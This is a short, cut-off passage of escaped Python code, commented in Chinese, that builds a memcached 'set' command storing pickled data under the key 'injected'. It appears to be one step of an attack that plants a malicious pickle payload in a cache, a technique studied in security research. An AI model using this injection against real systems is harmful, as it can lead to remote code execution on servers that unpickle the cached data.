    )\n        \n        # 注入 set 命令\n        set_cmd = f\"set injected 0 0 {len(pickle_data)}\\\
    r\\n\"\n        set_cmd_bytes = set_cmd.encode() + pickle_data + b'\\r\\n'\n \
